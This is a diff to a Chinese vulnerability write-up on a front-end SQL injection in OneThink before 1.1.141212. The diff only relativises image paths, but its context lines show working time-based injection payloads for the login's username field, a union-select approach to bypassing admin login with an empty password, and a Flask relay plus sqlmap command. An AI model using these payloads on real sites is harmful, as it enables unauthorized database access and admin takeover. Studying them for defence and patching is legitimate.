@@ -16,7 +16,7 @@ OneThink \< 1.1.141212
 
 以`OneThink 1.0.131218`为例，本地搭建起`one.think`
 
-![1.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId25.png)
+![1.png](./.resource/OneThink前台注入/media/rId25.png)
 
 打开源码文件夹，好家伙，踏破铁鞋无觅处，得来全不费工夫------thinkphp3.2.3的框架，那岂不是，
 
@@ -46,7 +46,7 @@ OneThink \< 1.1.141212
 
 进入`select`函数，关注到它的里面使用到了`buildSelectSql`方法
 
-![3.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId26.png)
+![3.png](./.resource/OneThink前台注入/media/rId26.png)
 
 `$options`变量的学问就在其中，
 
@@ -63,19 +63,19 @@ OneThink \< 1.1.141212
 
 这个`parseSql`里面，起到注入作用，最重要的就是`parseWhere`方法
 
-![4.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId27.png)
+![4.png](./.resource/OneThink前台注入/media/rId27.png)
 
 跟进`parseWhere`方法，425行将`$where`拆成``` $``key ```和``` $``val ```，在后面几个地方传入`parseWhereItem()`，
 
-![5.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId28.png)
+![5.png](./.resource/OneThink前台注入/media/rId28.png)
 
 parseKey是一个取值方法，没实际意义
 
-![6.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId29.png)
+![6.png](./.resource/OneThink前台注入/media/rId29.png)
 
 下面就是注入发生的地方了，好好分析一下这个`parseWhereItem()`函数
 
-![7.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId30.png)
+![7.png](./.resource/OneThink前台注入/media/rId30.png)
 
 首先，`$val`来源于上面的`$where`变量，是咱们可控的；其次，这里正则判断有大问题，没有使用`^`
 `$`来定界，导致`xxINxx`这种形式也能通过判断，`val[0]`在`IN`后面实际可构造出任意内容，后续进行了拼接，导致sql注入。
@@ -106,7 +106,7 @@ parseKey是一个取值方法，没实际意义
 
     username[]=in ('')) and (select 1 from (select sleep(4))x)--+-&password=2&verify=0x401
 
-![8.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId32.png)实际执行SQL语句
+![8.png](./.resource/OneThink前台注入/media/rId32.png)实际执行SQL语句
 
     SELECT * FROM `onethink_ucenter_member` WHERE ( `username` 
     IN (''))  AND (SELECT 1 FROM (SELECT SLEEP(4))X)-- - () ) LIMIT 1
@@ -115,7 +115,7 @@ parseKey是一个取值方法，没实际意义
 
     username[0]=exp&username[1]=>(select 1 from (select sleep(3))x)&password=2&verify=0x401
 
-![9.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId33.png)
+![9.png](./.resource/OneThink前台注入/media/rId33.png)
 
 实际执行SQL语句
 
@@ -126,7 +126,7 @@ parseKey是一个取值方法，没实际意义
 
     username[0]=BETWEEN 1 and ( select 1 from (select sleep(2))x)))--+-&username[1]=&password=2&verify=0x401
 
-![10.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId34.png)
+![10.png](./.resource/OneThink前台注入/media/rId34.png)
 
     SELECT * FROM `onethink_ucenter_member` WHERE (  (`username` 
         BETWEEN 1 AND ( SELECT 1 FROM (SELECT SLEEP(2))X)))-- - '' AND null ) ) LIMIT 1
@@ -142,11 +142,11 @@ ok，现在有了注入，我们就能使用联合查询，来绕过后台用户
 
 而数据表`onethink_ucenter_member`的结构如下图，有11列，那么联合注入就需要构造11个参数`union select 1,2,3,4,...,11`
 
-![11.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId37.png)
+![11.png](./.resource/OneThink前台注入/media/rId37.png)
 
 接着发现登录处的链接为`http://www.0-sec.org/index.php?s=/admin/public/login.html`，跟入源码
 
-![12.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId38.png)
+![12.png](./.resource/OneThink前台注入/media/rId38.png)
 
     # OneThink\Application\Admin\Controller\PublicController.class.php : 31L
     public function login($username = null, $password = null, $verify = null){
@@ -209,9 +209,9 @@ ok，现在有了注入，我们就能使用联合查询，来绕过后台用户
 
 得出结论：**如果输入值为空值，那么加密函数返回的结果也为空值**------舒服了，根本不必用到hash计算嘛！所以密码验证这一步也搞定了，只需要让POST上去的密码为空即可！
 
-![13.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId39.png)
+![13.png](./.resource/OneThink前台注入/media/rId39.png)
 
-![14.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId40.png)
+![14.png](./.resource/OneThink前台注入/media/rId40.png)
 
 网络不是不法之地。虽然已经可以进后台了，但依然不知道管理员的账号密码，有一些登录界面没有验证码，所以这里再提供一种对接SQLMAP的思路（非改tamper），供大家参考
 
@@ -219,7 +219,7 @@ ok，现在有了注入，我们就能使用联合查询，来绕过后台用户
 
 首先注入点位置如下图
 
-![15.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId42.png)
+![15.png](./.resource/OneThink前台注入/media/rId42.png)
 
     # encoding: utf-8
     # sqli-reverse-flask.py
@@ -254,7 +254,7 @@ ok，现在有了注入，我们就能使用联合查询，来绕过后台用户
 
 那么经过这个转发脚本，原本复杂的参数被简化，你只需要在本地对`http://127.0.0.1:5000/?id=1`跑sqlmap即可。原理上其实与写tamper脚本相同，都是让sqlmap能够识别出"简化过的"注入参数。
 
-![16.png](/Users/aresx/Documents/VulWiki/.resource/OneThink前台注入/media/rId43.png)
+![16.png](./.resource/OneThink前台注入/media/rId43.png)
 
     python sqlmap.py -u http://127.0.0.1:5000/?id=1  --tech=B --dbms=mysql --batch
 
